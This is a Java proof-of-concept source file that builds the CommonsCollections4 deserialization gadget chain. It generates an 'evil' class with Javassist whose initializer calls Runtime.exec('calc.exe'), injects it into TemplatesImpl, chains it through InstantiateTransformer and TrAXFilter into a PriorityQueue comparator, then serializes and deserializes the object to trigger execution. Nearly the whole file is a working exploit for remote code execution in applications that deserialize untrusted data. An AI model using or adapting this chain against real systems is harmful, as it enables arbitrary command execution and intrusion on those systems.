import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javax.xml.transform.Templates;


public class CommonsCollections4 {
    public static void setField(final Object obj , final String fieldname , final Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass evil = classPool.makeClass("evil");
        evil.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        evil.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] bytes = evil.toBytecode();
        byte[][] evilcodes = new byte[][]{bytes};

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setField(templatesImpl, "_bytecodes", evilcodes);
        setField(templatesImpl, "_name", "eviltest");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator comparatorevil = new TransformingComparator(chainedTransformer);
        PriorityQueue<Integer> queue = new PriorityQueue<Integer>(2);
        queue.add(1);
        queue.add(2);
        setField(queue, "comparator", comparatorevil);
        setField(queue, "queue", new Object[]{templatesImpl, templatesImpl});

        serialize(queue);
        unserialize();

    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream( new FileOutputStream("cc4.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static void unserialize() throws  Exception{
        ObjectInputStream inputStream = new ObjectInputStream( new FileInputStream("cc4.bin"));
        Object obj = inputStream.readObject();

    }

}